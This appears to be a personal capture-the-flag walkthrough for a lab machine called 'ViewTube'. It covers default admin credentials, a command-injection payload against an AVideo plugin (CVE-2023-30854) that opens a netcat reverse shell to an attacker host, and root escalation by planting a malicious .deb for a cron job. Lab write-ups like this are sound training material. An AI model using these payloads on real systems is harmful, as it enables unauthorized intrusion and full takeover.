
#ViewTube
IP = 10.0.160.161
Port = 80

#Found_exploit
link = https://github.com/WWBN/AVideo/security/advisories/GHSA-6vrj-ph27-qfp3
CVE = CVE-2023-30854

Host a python server under /var/www/html/plugin/CloneSite/ which contains the cloneServer.json.php file 

#Credentials
username = admin
password = admin

![[Pasted image 20241013224348.png]]
			# figure of site in admin pane

#Vuln_path
Admin Panel --> Miscellaneous --> Plugins --> CloneSite

![[Pasted image 20241013225010.png]]

#Payload
```bash
http://10.10.6.78/cloneServer.json.php;nc$IFS'10.10.6.78'$IFS'9999'$IFS-e$IFS/bin/sh;#
```
Edit Parameter and paste in the payload. # **NOTE:** make sure you've set up your listener.



#Inital_Access
After getting shell, do all manual enumerations. When you find nothing, send `pspy64` to the machine. You would see some cron job  that runs this command;
```sh
dpkg --force-all -i /tmp/updated-dpks/*.deb
```

![[Pasted image 20241013231454.png]]

Meaning it runs and installs a .deb file in updated-dpks folder but look under the 'tmp' file there is no file named that.

#Exploitation
This means we have the advantage of creating a new folder `updated-dpks`.
	***create a malicious deb file inside of `/tmp/updated-dpks/` *
*** HackerGPT is the better half for the exploit file :)

After properly setting everything, spawn a `nc` listener on your machine with the specified port to receive the root callback. 


#Have_Fun_Hacking_:)